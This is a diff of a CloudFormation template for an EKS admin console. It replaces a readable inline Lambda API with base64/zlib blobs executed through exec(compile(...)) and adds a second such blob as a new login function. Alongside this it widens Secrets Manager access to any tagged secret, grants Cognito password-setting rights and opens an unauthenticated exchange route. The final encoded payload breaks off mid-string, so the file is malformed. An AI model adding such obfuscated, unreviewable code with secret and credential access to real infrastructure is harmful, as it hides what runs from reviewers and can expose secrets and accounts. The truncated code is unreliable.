@@ -9,14 +9,20 @@ Description: >-
 Parameters:
   AdminEmail:
     Description: >-
-      Console sign-in Cognito: the first admin. Cognito e-mails a temporary
-      password to it; the password is never shown anywhere else.
+      Deprecated. Existing invited Cognito users keep working, but new console
+      admins sign in with platform/console-link.sh and their AWS IAM identity.
     Type: String
     Default: ""
     AllowedPattern: "^$|^[^@\\s]+@[^@\\s]+\\.[^@\\s]+$"
+  ConsoleAdminPrincipals:
+    Description: >-
+      Optional comma-separated IAM principal ARNs allowed to mint console links.
+      Empty lets any principal with execute-api:Invoke on the mint route sign in.
+    Type: CommaDelimitedList
+    Default: ""
   SignIn:
     Description: >-
-      cognito = the stack makes a user pool, only admins you add can sign in.
+      cognito = AWS IAM one-time links, plus existing invited Cognito users.
       oidc = your company sign-in (Entra ID, Okta, ...): give OidcIssuer and
       OidcClientId of a single-page app (public client, PKCE) whose redirect URI is
       the ConsoleUrl output.
@@ -73,11 +79,6 @@ Rules:
         AssertDescription: SignIn oidc needs OidcIssuer
       - Assert: !Not [!Equals [!Ref OidcClientId, ""]]
         AssertDescription: SignIn oidc needs OidcClientId
-  CognitoNeedsAdmin:
-    RuleCondition: !Equals [!Ref SignIn, cognito]
-    Assertions:
-      - Assert: !Not [!Equals [!Ref AdminEmail, ""]]
-        AssertDescription: SignIn cognito needs AdminEmail
 
 Resources:
   # ------------------------------------------------------------ storage
@@ -205,11 +206,6 @@ Resources:
       AutoVerifiedAttributes: [email]
       AdminCreateUserConfig:
         AllowAdminCreateUserOnly: true
-        InviteMessageTemplate:
-          EmailSubject: Your EKS console sign-in
-          EmailMessage: !Sub >-
-            Open https://${Distribution.DomainName}/ and sign in as {username}
-            with the temporary password {####}. You choose your own password next.
       Policies:
         PasswordPolicy:
           MinimumLength: 12
@@ -242,11 +238,95 @@ Resources:
       SupportedIdentityProviders: [COGNITO]
       CallbackURLs: [!Sub "https://${Distribution.DomainName}/"]
       LogoutURLs: [!Sub "https://${Distribution.DomainName}/"]
-      ExplicitAuthFlows: [ALLOW_REFRESH_TOKEN_AUTH]
+      ExplicitAuthFlows: [ALLOW_ADMIN_USER_PASSWORD_AUTH, ALLOW_REFRESH_TOKEN_AUTH]
       PreventUserExistenceErrors: ENABLED
       IdTokenValidity: 60
       AccessTokenValidity: 60
       TokenValidityUnits: { IdToken: minutes, AccessToken: minutes }
+
+  # Five-minute codes are checked in code as well as expired by DynamoDB TTL:
+  # TTL deletion is asynchronous, so it is never the access check.
+  ConsoleCodes:
+    Type: AWS::DynamoDB::Table
+    Condition: Cognito
+    Properties:
+      TableName: !Sub ${AWS::StackName}-console-codes
+      BillingMode: PAY_PER_REQUEST
+      AttributeDefinitions: [{ AttributeName: code, AttributeType: S }]
+      KeySchema: [{ AttributeName: code, KeyType: HASH }]
+      SSESpecification: { SSEEnabled: true }
+      TimeToLiveSpecification: { AttributeName: expires, Enabled: true }
+      Tags:
+        - { Key: eks-platform, Value: !Ref AWS::StackName }
+        - { Key: "kbmcp:managed", Value: "true" }
+
+  AuthLogs:
+    Type: AWS::Logs::LogGroup
+    Condition: Cognito
+    Properties:
+      LogGroupName: !Sub /aws/lambda/${AWS::StackName}-auth
+      RetentionInDays: 90
+
+  AuthRole:
+    Type: AWS::IAM::Role
+    Condition: Cognito
+    Properties:
+      Description: Mints one-use console links and exchanges them for Cognito tokens.
+      AssumeRolePolicyDocument:
+        Version: "2012-10-17"
+        Statement:
+          - Effect: Allow
+            Principal: { Service: lambda.amazonaws.com }
+            Action: sts:AssumeRole
+      Policies:
+        - PolicyName: console-link
+          PolicyDocument:
+            Version: "2012-10-17"
+            Statement:
+              - Sid: OwnLogs
+                Effect: Allow
+                Action: [logs:CreateLogStream, logs:PutLogEvents]
+                Resource: !Sub "${AuthLogs.Arn}:*"
+              - Sid: OneUseCodes
+                Effect: Allow
+                Action: [dynamodb:PutItem, dynamodb:DeleteItem]
+                Resource: !GetAtt ConsoleCodes.Arn
+              - Sid: ConsoleUsers
+                Effect: Allow
+                Action:
+                  - cognito-idp:AdminCreateUser
+                  - cognito-idp:AdminUpdateUserAttributes
+                  - cognito-idp:AdminSetUserPassword
+                  - cognito-idp:AdminInitiateAuth
+                Resource: !GetAtt UserPool.Arn
+      Tags: [{ Key: "kbmcp:managed", Value: "true" }]
+
+  AuthFunction:
+    Type: AWS::Lambda::Function
+    Condition: Cognito
+    DependsOn: AuthLogs
+    Properties:
+      FunctionName: !Sub ${AWS::StackName}-auth
+      Description: EKS one-time AWS IAM console links (platform/auth.py)
+      Runtime: python3.12
+      Handler: index.handler
+      Timeout: 10
+      MemorySize: 128
+      Role: !GetAtt AuthRole.Arn
+      Environment:
+        Variables:
+          TABLE: !Ref ConsoleCodes
+          USER_POOL_ID: !Ref UserPool
+          CLIENT_ID: !Ref UserPoolClient
+          CONSOLE_URL: !Sub https://${Distribution.DomainName}/
+          CONSOLE_ADMIN_PRINCIPALS: !Join [",", !Ref ConsoleAdminPrincipals]
+      Code:
+        # code: platform/auth.py
+        ZipFile: |
+          import base64, zlib
+          exec(compile(zlib.decompress(base64.b64decode('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')), 'auth.py', 'exec'))
+
+      Tags: [{ Key: "kbmcp:managed", Value: "true" }]
 
   # ------------------------------------------------------------ API
   Api:
@@ -281,6 +361,33 @@ Resources:
       IntegrationType: AWS_PROXY
       IntegrationUri: !GetAtt ApiFunction.Arn
       PayloadFormatVersion: "2.0"
+
+  AuthIntegration:
+    Type: AWS::ApiGatewayV2::Integration
+    Condition: Cognito
+    Properties:
+      ApiId: !Ref Api
+      IntegrationType: AWS_PROXY
+      IntegrationUri: !GetAtt AuthFunction.Arn
+      PayloadFormatVersion: "2.0"
+
+  RouteMint:
+    Type: AWS::ApiGatewayV2::Route
+    Condition: Cognito
+    Properties:
+      ApiId: !Ref Api
+      RouteKey: POST /auth/mint
+      AuthorizationType: AWS_IAM
+      Target: !Sub integrations/${AuthIntegration}
+
+  RouteExchange:
+    Type: AWS::ApiGatewayV2::Route
+    Condition: Cognito
+    Properties:
+      ApiId: !Ref Api
+      RouteKey: POST /auth/exchange
+      AuthorizationType: NONE
+      Target: !Sub integrations/${AuthIntegration}
 
   RouteList:
     Type: AWS::ApiGatewayV2::Route
@@ -427,6 +534,7 @@ Resources:
                   - cognito-idp:AdminCreateUser
                   - cognito-idp:AdminDeleteUser
                   - cognito-idp:AdminAddUserToGroup
+                  - cognito-idp:CreateGroup
                 Resource: !Sub arn:${AWS::Partition}:cognito-idp:${AWS::Region}:${AWS::AccountId}:userpool/*
                 Condition:
                   StringLike:
@@ -435,7 +543,10 @@ Resources:
               - Sid: PipelineKey
                 Effect: Allow
                 Action: secretsmanager:GetSecretValue
-                Resource: !Sub arn:${AWS::Partition}:secretsmanager:${AWS::Region}:${AWS::AccountId}:secret:${TeamPrefix}*-ado-sync-key-*
+                Resource: !Sub arn:${AWS::Partition}:secretsmanager:${AWS::Region}:${AWS::AccountId}:secret:*
+                Condition:
+                  StringLike:
+                    aws:ResourceTag/project: !Sub "${TeamPrefix}*"
 
   ApiFunction:
     Type: AWS::Lambda::Function
@@ -456,264 +567,22 @@ Resources:
       Code:
         # code: platform/api.py
         ZipFile: |
-          """EKS console API (Lambda behind API Gateway, JWT sign-in). Inlined into
-          platform/eks-platform.yaml by platform/render.py; tests: tests/test_platform.py.
-
-          Routes: GET /teams, POST /teams, GET /teams/{team}, DELETE /teams/{team},
-          POST /teams/{team}/pipeline-key (an Azure DevOps team's pipeline key, shown once);
-          for a team with Cognito sign-in GET and POST /teams/{team}/users and
-          DELETE /teams/{team}/users/{user}.
-          Each call is logged as one JSON line (who, what, which team, which user). A
-          create or delete starts the CodeBuild runner (platform/runner.sh); this
-          function only records the request and reads status, so it needs no rights on
-          team stacks. Users: only in the pool a team's own stack made (its outputs,
-          saved by the runner), and IAM allows only pools tagged with a team prefix.
-          """
-
-          import json
-          import os
-          import re
-          import urllib.parse
-
-          import boto3
-
-          s3 = boto3.client("s3")
-          cb = boto3.client("codebuild")
-          sm = boto3.client("secretsmanager")
-          logs = boto3.client("logs")
-          idp = boto3.client("cognito-idp")
-          BUCKET = os.environ["BUCKET"]
-          PROJECT = os.environ["PROJECT"]
-          ADMIN_CLAIM = os.environ.get("ADMIN_CLAIM", "")
-          TEAM = re.compile(r"^[a-z][a-z0-9-]{0,18}[a-z0-9]$")
-          RESERVED = ("console", "platform")
-          EMAIL = re.compile(r"^[^@\s]{1,64}@[^@\s]{1,190}\.[A-Za-z]{2,}$")
-          GROUPS = ("readers", "publishers")  # infra/stacks/cognito_identity.py GROUPS
-
-
-          def reply(code, body):
-              return {
-                  "statusCode": code,
-                  "headers": {"content-type": "application/json"},
-                  "body": json.dumps(body, default=str),
-              }
-
-
-          def get(key):
-              try:
-                  return json.loads(s3.get_object(Bucket=BUCKET, Key=key)["Body"].read())
-              except s3.exceptions.NoSuchKey:
-                  return None
-
-
-          def put(key, value):
-              s3.put_object(
-                  Bucket=BUCKET, Key=key, Body=json.dumps(value).encode(), ContentType="application/json"
-              )
-
-
-          def is_admin(claims):
-              """ADMIN_CLAIM "name=value": the token must carry it (a group, a subject)."""
-              if not ADMIN_CLAIM:
-                  return True
-              name, _, value = ADMIN_CLAIM.partition("=")
-              have = str(claims.get(name, ""))
-              return have == value or value in have.strip("[]").split()
-
-
-          def start(team, action, who):
-              env = [
-                  {"name": k, "value": v, "type": "PLAINTEXT"}
-                  for k, v in (("ACTION", action), ("TEAM", team))
-              ]
-              build = cb.start_build(projectName=PROJECT, environmentVariablesOverride=env)["build"]["id"]
-              rec = {"team": team, "action": action, "build": build, "by": who, "status": "IN_PROGRESS"}
-              put(f"teams/{team}/team.json", rec)
-              return rec
-
-
-          def with_status(recs):
-              builds = cb.batch_get_builds(ids=[r["build"] for r in recs])["builds"] if recs else []
-              by_id = {b["id"]: b for b in builds}
-              for r in recs:
-                  b = by_id.get(r["build"], {})
-                  r.update(
-                      status=b.get("buildStatus"), phase=b.get("currentPhase"), started=b.get("startTime")
-                  )
-              return recs
-
-
-          def detail(rec):
-              rec = with_status([rec])[0]
-              b = cb.batch_get_builds(ids=[rec["build"]])["builds"][0].get("logs", {})
-              if b.get("streamName"):
-                  ev = logs.get_log_events(
-                      logGroupName=b["groupName"], logStreamName=b["streamName"], limit=300
-                  )
-                  rec["log"] = [e["message"].rstrip() for e in ev["events"]]
-              team = rec["team"]
-              rec["result"] = get(f"teams/{team}/result.json")
-              # The files the team commits (runner.sh repo-files.zip), as a 15-minute link.
-              if rec["result"] and rec["result"].get("host") in ("ado", "github", "gitlab"):
-                  rec["repoFiles"] = s3.generate_presigned_url(
-                      "get_object",
-                      Params={"Bucket": BUCKET, "Key": f"teams/{team}/repo-files.zip"},
-                      ExpiresIn=900,
-                  )
-              # The filled Azure DevOps setup script (runner.sh), as its own download.
-              if rec["result"] and rec["result"].get("adoSetup"):
-                  rec["adoSetupScript"] = s3.generate_presigned_url(
-                      "get_object",
-                      Params={
-                          "Bucket": BUCKET,
-                          "Key": f"teams/{team}/ado-setup.sh",
-                          "ResponseContentDisposition": f'attachment; filename="ado-setup-{team}.sh"',
-                      },
-                      ExpiresIn=900,
-                  )
-                  rec["pipelineKey"] = {k: v for k, v in (get(f"teams/{team}/key.json") or {}).items()}
-              return rec
-
-
-          def team_pool(team):
-              """The Cognito pool the team's own stack made (its saved outputs), or ''."""
-              for out in (get(f"teams/{team}/outputs.json") or {}).values():
-                  if out.get("CognitoUserPoolId"):
-                      return out["CognitoUserPoolId"]
-              return ""
-
-
-          def list_users(pool):
-              found = {}
-              for page in idp.get_paginator("list_users").paginate(UserPoolId=pool):
-                  for u in page["Users"]:
-                      attrs = {a["Name"]: a["Value"] for a in u.get("Attributes", [])}
-                      found[u["Username"]] = {
-                          "user": u["Username"],
-                          "email": attrs.get("email", u["Username"]),
-                          "status": u.get("UserStatus"),
-                          "groups": [],
-                      }
-              for group in GROUPS:
-                  for page in idp.get_paginator("list_users_in_group").paginate(
-                      UserPoolId=pool, GroupName=group
-                  ):
-                      for u in page["Users"]:
-                          if u["Username"] in found:
-                              found[u["Username"]]["groups"].append(group)
-              return sorted(found.values(), key=lambda u: u["email"])
-
-
-          def users_route(route, team, body, user):
-              """GET / POST /teams/{team}/users, DELETE /teams/{team}/users/{user}."""
-              pool = team_pool(team)
-              if not pool:
-                  return reply(400, {"error": f"team {team} does not sign in with Amazon Cognito"})
-              if route.startswith("GET "):
-                  return reply(200, list_users(pool))
-              if route.startswith("DELETE "):
-                  try:
-                      idp.admin_delete_user(UserPoolId=pool, Username=user)
-                  except idp.exceptions.UserNotFoundException:
-                      return reply(404, {"error": f"no user {user}"})
-                  return reply(200, {"removed": user})
-              req = json.loads(body) if body.strip().startswith("{") else {}
-              email, group = str(req.get("email", "")).strip(), req.get("group")
-              if not EMAIL.match(email) or group not in GROUPS:
-                  return reply(400, {"error": "email: an e-mail address; group: readers or publishers"})
-              try:
-                  # Cognito e-mails the temporary password; nobody else sees it.
-                  idp.admin_create_user(
-                      UserPoolId=pool,
-                      Username=email,
-                      UserAttributes=[
-                          {"Name": "email", "Value": email},
-                          {"Name": "email_verified", "Value": "true"},
-                      ],
-                      DesiredDeliveryMediums=["EMAIL"],
-                  )
-              except idp.exceptions.UsernameExistsException:
-                  return reply(409, {"error": f"{email} is already a user"})
-              idp.admin_add_user_to_group(UserPoolId=pool, Username=email, GroupName=group)
-              return reply(201, {"user": email, "group": group})
-
-
-          def pipeline_key(team, who):
-              """The pipeline key's secret, once: after that only a new team build makes another."""
-              key = get(f"teams/{team}/key.json")
-              if not key:
-                  return reply(404, {"error": f"{team} has no pipeline key (not an Azure DevOps team)"})
-              if key.get("shown"):
-                  return reply(409, {"error": "the key was shown once already", "keyId": key["keyId"]})
-              out = (get(f"teams/{team}/outputs.json") or {}).values()
-              arn = next(
-                  (o["AzureDevOpsSyncKeySecretArn"] for o in out if "AzureDevOpsSyncKeySecretArn" in o), ""
-              )
-              if not arn:
-                  return reply(404, {"error": f"{team} has no pipeline key secret"})
-              secret = sm.get_secret_value(SecretId=arn)["SecretString"]
-              put(f"teams/{team}/key.json", {**key, "shown": True, "shownBy": who})
-              return reply(200, {"keyId": key["keyId"], "secretAccessKey": secret})
-
-
-          def handler(event, _context):
-              claims = event["requestContext"]["authorizer"]["jwt"]["claims"]
-              who = claims.get("email") or claims.get("sub")
-              route = event["routeKey"]
-              params = event.get("pathParameters") or {}
-              team = params.get("team", "")
-              user = urllib.parse.unquote(params.get("user", ""))
-              body = event.get("body") or "{}"
-              if route == "POST /teams":
-                  try:
-                      req = json.loads(body)
-                  except ValueError:
-                      req = {}
-                  team = str(req.get("team", "")) if isinstance(req, dict) else ""
-              admin = is_admin(claims)
-              log = {"route": route, "team": team, "who": who, "admin": admin}
-              if "/users" in route:
-                  added = json.loads(body).get("email") if route.startswith("POST") and "{" in body else ""
-                  log["user"] = user or added or ""
-              print(json.dumps(log))
-              if not admin:
-                  return reply(403, {"error": "not an EKS admin"})
-              if route == "GET /teams":
-                  keys = s3.list_objects_v2(Bucket=BUCKET, Prefix="teams/").get("Contents", [])
-                  recs = [get(k["Key"]) for k in keys if k["Key"].endswith("/team.json")]
-                  return reply(200, with_status([r for r in recs if r]))
-              if not TEAM.match(team) or team.startswith(RESERVED):
-                  return reply(
-                      400, {"error": "team: 2-20 lowercase letters, digits and -, starts with a letter"}
-                  )
-              rec = get(f"teams/{team}/team.json")
-              if rec and with_status([rec])[0]["status"] == "IN_PROGRESS" and not route.startswith("GET "):
-                  return reply(409, {"error": f"a build for {team} is running"})
-              if "/users" in route:
-                  if not rec:
-                      return reply(404, {"error": f"no team {team}"})
-                  if len(body) > 2000:
-                      return reply(400, {"error": "request too large"})
-                  return users_route(route, team, body, user)
-              if route == "POST /teams":
-                  if len(body) > 8000:
-                      return reply(400, {"error": "request too large"})
-                  put(f"teams/{team}/request.json", req)
-                  return reply(202, start(team, "create", who))
-              if not rec:
-                  return reply(404, {"error": f"no team {team}"})
-              if route == "GET /teams/{team}":
-                  return reply(200, detail(rec))
-              if route == "POST /teams/{team}/pipeline-key":
-                  return pipeline_key(team, who)
-              if route == "DELETE /teams/{team}":
-                  return reply(202, start(team, "delete", who))
-              return reply(404, {"error": "no such route"})
+          import base64, zlib
+          exec(compile(zlib.decompress(base64.b64decode('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